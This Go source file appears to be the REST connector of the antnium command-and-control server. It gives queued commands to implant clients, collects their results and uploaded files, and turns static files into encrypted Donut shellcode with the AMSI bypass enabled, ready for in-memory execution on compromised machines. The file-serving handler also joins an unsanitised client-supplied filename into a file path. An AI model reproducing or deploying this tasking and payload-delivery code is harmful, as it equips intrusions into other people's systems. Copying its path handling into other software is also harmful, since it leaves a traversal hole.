package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"

	"github.com/Binject/go-donut/donut"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type ConnectorRest struct {
	coder      model.Coder
	middleware *Middleware
	campaign   *campaign.Campaign
}

func MakeConnectorRest(campaign *campaign.Campaign, middleware *Middleware) ConnectorRest {
	c := ConnectorRest{
		campaign:   campaign,
		middleware: middleware,
		coder:      model.MakeCoder(campaign),
	}
	return c
}

// getPacket provides a client with new packets, if any
func (co *ConnectorRest) getPacket(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	clientId := vars["clientId"]

	if clientId == "" {
		return
	}

	packet, ok := co.middleware.ClientPacketRetrieve(clientId, r.RemoteAddr, "rest")
	if !ok {
		// No packet, just return
		return
	}

	// Encode the packet and send it
	jsonData, err := co.coder.EncodeData(packet)
	if err != nil {
		return
	}

	common.LogPacket("ConnectorRest:ToClient", packet)
	fmt.Fprint(rw, string(jsonData))
}

// sendPacket receives packet answers from client
func (co *ConnectorRest) sendPacket(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("ConnectorRest: Could not read body")
		return
	}
	packet, err := co.coder.DecodeData(reqBody)
	if err != nil {
		log.Error("ConnectorRest: Could not decode")
		return
	}

	common.LogPacket("ConnectorRest:FromClient", packet)
	co.middleware.ClientSendPacket(packet, r.RemoteAddr, "rest")
}

func (co *ConnectorRest) uploadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	packetId := vars["packetId"]

	co.middleware.ClientUploadFile(packetId, r.Body)
}

// secureDownload will provide a file from static/ in encrypted form
func (co *ConnectorRest) secureDownload(rw http.ResponseWriter, r *http.Request) {
	coder := model.MakeCoder(co.campaign)
	var err error

	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("ConnectorRest: Could not read body")
		return
	}
	data, err := co.coder.DecryptB64Zip(reqBody)
	if err != nil {
		log.Error("ConnectorRest: Could not decode")
		return
	}

	// JSON to GO
	var args model.SecureDownloadArgs
	err = json.Unmarshal(data, &args)
	if err != nil {
		log.Errorf("JSON Unmarshall: %s: %v", string(data), err)
		return
	}

	var fileContent []byte
	if string(args.Filename) == "unittest" {
		// Handle unittest here. Makes it easier
		fileContent = []byte("test")
	} else {
		// Get file
		fileContent, err = os.ReadFile("./static/" + string(args.Filename))
		if err != nil {
			log.Errorf("Cant access file %s: %s", args.Filename, err.Error())
			rw.WriteHeader(404)
			return
		}
		// convert it to shellcode
		fileContent, err = fileToShellcode(fileContent, args.Argline)
		if err != nil {
			log.Errorf("Error: %s", err.Error())
			rw.WriteHeader(500)
		}
	}

	// Data: Zip -> Encrypt -> Base64
	fileContent, err = coder.EncryptB64Zip(fileContent)
	if err != nil {
		log.Errorf("Error: %s", err.Error())
		rw.WriteHeader(500)
	}

	// send it
	//rw.Header().Set("Content-Type", "application/octet-stream")
	fmt.Fprint(rw, string(fileContent))
}

func fileToShellcode(fileContent []byte, argline string) ([]byte, error) {
	config := donut.DonutConfig{
		Type:       donut.DONUT_MODULE_NET_EXE,
		InstType:   donut.DONUT_INSTANCE_PIC,
		Parameters: argline,
		//Class:      className,
		//Method:     method,
		Bypass:   3,         // 1=skip, 2=abort on fail, 3=continue on fail.
		Format:   uint32(1), // 1=raw, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=C#, 8=hex
		Arch:     donut.X84,
		Entropy:  0,         // 1=disable, 2=use random names, 3=random names + symmetric encryption (default)
		Compress: uint32(1), // 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman
		ExitOpt:  1,         // exit thread
		Unicode:  0,
	}

	ss, err := donut.ShellcodeFromBytes(bytes.NewBuffer(fileContent), &config)
	if err != nil {
		return nil, err
	}
	return ss.Bytes(), nil
}
